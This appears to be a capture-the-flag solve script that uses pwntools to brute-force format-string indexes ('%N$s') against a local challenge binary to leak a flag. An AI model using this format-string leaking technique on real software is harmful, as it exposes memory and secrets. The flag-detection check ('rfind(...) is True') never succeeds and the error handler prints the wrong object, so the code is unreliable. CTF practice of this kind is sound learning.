"""
This script was an attempt to enumerate all format string indexes, and get the data from flag.txt.
"""


import pwn

for num in range(0, 1500):
    print(f"\nIndex: {num}\n")
    proc = pwn.process("./vuln") # execute ./vuln

    proc.recvuntil(b"you:") # receive data until "you:"
    proc.send(b"%"+ str(num).encode("utf-8") + b"$s\r\n") # sends %num$s to the stdin of the process.

    output: bytes = proc.recvall() # retreive the stdout of the process.

    # if the contents of output are not printable.
    if not pwn.printable(output):
        proc.close()
        continue

    # try finding the "pico" word in the output.
    try:
            if str(output.decode()).rfind("pico", 0, -1) is True:
                print(f"FLAG: {output.decode()}", end="")
                proc.close()
                break

            # if cannot find "pico" then just print the content.
            print(output.decode(), end="")
    except Exception:
            print(f"Failed to read with exception: {Exception}\n")


    proc.close()
    print("\n\n")
